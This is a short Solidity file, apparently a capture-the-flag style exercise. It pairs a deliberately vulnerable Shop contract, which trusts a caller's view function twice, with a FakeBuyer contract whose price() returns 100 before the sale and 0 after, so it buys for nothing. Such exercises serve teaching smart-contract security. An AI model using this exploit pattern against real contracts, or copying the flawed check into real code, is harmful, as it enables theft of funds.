// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint);
}

contract Shop {
    uint public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

contract FakeBuyer is Buyer {
    Shop public shop;

    constructor(address _shop) {
        shop = Shop(_shop);
    }

    function buy() external {
        shop.buy();
    }

    function price() external view returns (uint) {
        return shop.isSold() ? 0 : 100;
    }
}
